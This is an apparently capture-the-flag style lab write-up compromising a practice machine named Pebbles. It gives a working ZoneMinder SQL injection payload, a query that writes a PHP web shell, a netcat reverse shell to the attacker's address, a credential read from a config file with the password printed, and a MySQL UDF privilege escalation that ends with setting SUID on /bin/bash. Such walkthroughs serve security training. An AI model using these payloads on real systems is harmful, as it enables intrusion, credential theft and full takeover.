---
icon: ubuntu
---

# Pebbles - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.159.52 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 00:14 EDT
Nmap scan report for 192.168.159.52
Host is up (0.029s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Apache Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Google Android 8.X (91%), Synology DiskStation Manager 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.11 - 4.9 (91%), Linux 4.4 (90%), Linux 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.38 ms 192.168.45.1
2   27.05 ms 192.168.45.254
3   28.34 ms 192.168.251.1
4   28.77 ms 192.168.159.52
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2315).png" alt=""><figcaption></figcaption></figure>

We are greeted by a page requiring credentials to proceed further. I will run directory busting and see what I can find:

```
feroxbuster -u http://192.168.159.52/
```

<figure><img src="../../.gitbook/assets/image (2316).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2317).png" alt=""><figcaption></figcaption></figure>

There is a sql injection exploit available on Searchsploit for our specific version

<figure><img src="../../.gitbook/assets/image (2318).png" alt=""><figcaption></figcaption></figure>

I am going to keep this in mind and check the other ports before trying to exploit

### <mark style="color:$primary;">HTTP Port 3305 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2319).png" alt=""><figcaption></figcaption></figure>

There is a default apache page here

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2320).png" alt=""><figcaption></figcaption></figure>

Another Default Tomacat webpage. I am going to try to exploit the SQLI

### <mark style="color:$primary;">ZoneMinder 1.29.0 SQLI -> RCE</mark>

```
searchsploit -m 41239
```

Start BurpSuite and capture the [http://192.168.159.52/zm/index.php](http://192.168.159.52/zm/index.php) request and send it to repeater.

<mark style="color:$success;">**First step**</mark> right click on the request and select <mark style="color:$success;">**Change Request Method**</mark>

The exploit offers us a Sample Payload, I am going to modify it a bit

<mark style="color:$success;">**Second Step**</mark> copy the below payload and add it to your request

```
view=request&request=log&task=query&limit=100;SELECT SLEEP(10)#&minTime=5 
```

<figure><img src="../../.gitbook/assets/image (2321).png" alt=""><figcaption></figcaption></figure>

This should make your response take 10 seconds to come back.&#x20;

We know we have SQLI and we also know that we have 2 default webpages. I am going to try and place a reverse php webshell and see if I can access it via any of the webpages

```
select "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/rce.php"#
```

<figure><img src="../../.gitbook/assets/image (2322).png" alt=""><figcaption></figcaption></figure>

We got a 200 OK, let's check it out!

<figure><img src="../../.gitbook/assets/image (2323).png" alt=""><figcaption></figcaption></figure>

It worked, now to get a reverse shell!

<figure><img src="../../.gitbook/assets/image (2324).png" alt=""><figcaption></figcaption></figure>

nc is on the machine I will make use of that

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

Make sure you have a listener ready!

<figure><img src="../../.gitbook/assets/image (2325).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2326).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2332).png" alt=""><figcaption></figcaption></figure>

There is another user besides root I will keep that in mind while I am performing manual enumeration.

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2333).png" alt=""><figcaption></figcaption></figure>

That is a config file we should find some credentials.

```
cat /etc/zm/zm.conf
```

<figure><img src="../../.gitbook/assets/image (2334).png" alt=""><figcaption></figcaption></figure>

I found some MySQL database credentials, let's check it out

### <mark style="color:$primary;">Enumerating MySQL zm database</mark>

```
mysql -h localhost -u root -p'ShinyLucentMarker361' -P 3306
```

<figure><img src="../../.gitbook/assets/image (2335).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2336).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2337).png" alt=""><figcaption></figcaption></figure>

The database did not offer anything useful, I only found a hash for the admin user. Also the database password <mark style="color:$success;">**ShinyLucentMarker361**</mark> did not work for sally or root. Rabbit hole :rofl:

### <mark style="color:$primary;">Questioning What I am doing?</mark>

We have some database credentials, let's check the processes. Who is running mysql?

```
ps auxwww
```

<figure><img src="../../.gitbook/assets/image (2327).png" alt=""><figcaption></figcaption></figure>

Mysql is running as the root user!

<figure><img src="../../.gitbook/assets/image (2328).png" alt=""><figcaption></figcaption></figure>

Mysql version is 5.7 let's see if I can find an exploit I can use

### <mark style="color:$primary;">MySQL v 4.x/5.0 Privesc</mark>

<figure><img src="../../.gitbook/assets/image (2329).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 1518.c
```

Searchsploit does reveal a priv esc exploit. I am going to download it and compile it on my machine. Commands for compiling the exploit:

```
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
```

<figure><img src="../../.gitbook/assets/image (2330).png" alt=""><figcaption></figcaption></figure>

Now we will transfer <mark style="color:$success;">**raptor\_udf2.so**</mark> to the target machine&#x20;

```
wget 192.168.45.158/raptor_udf2.so
```

<figure><img src="../../.gitbook/assets/image (2331).png" alt=""><figcaption></figcaption></figure>

Next we will execute the  following query to insert raptor\_udf2.so and create a function that will allows us to run commands

```
mysql -h localhost -u root -p'ShinyLucentMarker361' -P 3306
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

<figure><img src="../../.gitbook/assets/image (2338).png" alt=""><figcaption></figcaption></figure>

Now I am going to keep it simple and just set the suid for /bin/bash to escalate my privileges to root. For that I will execute the following command:

```
select do_system('chmod +s /bin/bash');
```

<figure><img src="../../.gitbook/assets/image (2339).png" alt=""><figcaption></figcaption></figure>

now we should have the SUID bit set on /bin/bash

<figure><img src="../../.gitbook/assets/image (2340).png" alt=""><figcaption></figcaption></figure>

We are root! let's go!
